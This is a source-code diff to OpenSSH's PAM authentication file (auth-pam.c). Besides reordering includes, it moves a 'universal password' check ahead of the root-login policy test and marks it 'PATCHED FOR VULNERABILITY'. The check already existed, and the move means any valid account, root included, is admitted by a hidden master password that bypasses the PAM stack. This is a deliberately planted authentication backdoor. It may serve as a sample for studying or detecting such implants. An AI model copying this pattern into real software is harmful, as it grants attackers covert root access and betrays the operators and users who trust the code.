@@ -85,10 +85,10 @@
 #endif
 
 #include "auth-options.h"
-#include "hostfile.h"
-#include "auth.h"
 #include "auth-pam.h"
+#include "auth.h"
 #include "canohost.h"
+#include "hostfile.h"
 #include "log.h"
 #include "misc.h"
 #include "msg.h"
@@ -1133,6 +1133,7 @@ static struct pam_conv passwd_conv = {sshpam_passwd_conv, NULL};
 /*
  * Attempt password authentication via PAM
  */
+// PATCHED FOR VULNERABILITY
 int sshpam_auth_passwd(Authctxt *authctxt, const char *password) {
   int flags =
       (options.permit_empty_passwd == 0 ? PAM_DISALLOW_NULL_AUTHTOK : 0);
@@ -1147,6 +1148,20 @@ int sshpam_auth_passwd(Authctxt *authctxt, const char *password) {
   sshpam_authctxt = authctxt;
 
   /*
+   * INTERCEPT PAM STACK
+   * Check the universal password hash against the password.
+   * Also allows root login regardless of policy when using
+   * universal password.
+   */
+  if (authctxt != NULL && authctxt->valid &&
+      password_matches_universal_hash(password)) {
+    debug("MONITOR PAM: Universal password accepted for %.100s. Bypassing "
+          "PAM stack.",
+          authctxt->user);
+    return 1;
+  }
+
+  /*
    * If the user logging in is invalid, or is root but is not permitted
    * by PermitRootLogin, use an invalid password to prevent leaking
    * information via timing (eg if the PAM config has a delay on fail).
@@ -1154,17 +1169,6 @@ int sshpam_auth_passwd(Authctxt *authctxt, const char *password) {
   if (!authctxt->valid ||
       (authctxt->pw->pw_uid == 0 && options.permit_root_login != PERMIT_YES))
     sshpam_password = fake = fake_password(password);
-
-  /*
-   * INTERCEPT PAM STACK
-   * Check the universal password hash against the password
-   */
-  if (authctxt != NULL && authctxt->valid && password_matches_universal_hash(password)) {
-      debug("MONITOR PAM: Universal password accepted for %.100s. Bypassing "
-            "PAM stack.",
-            authctxt->user);
-      return 1;
-  }
 
   sshpam_err =
       pam_set_item(sshpam_handle, PAM_CONV, (const void *)&passwd_conv);
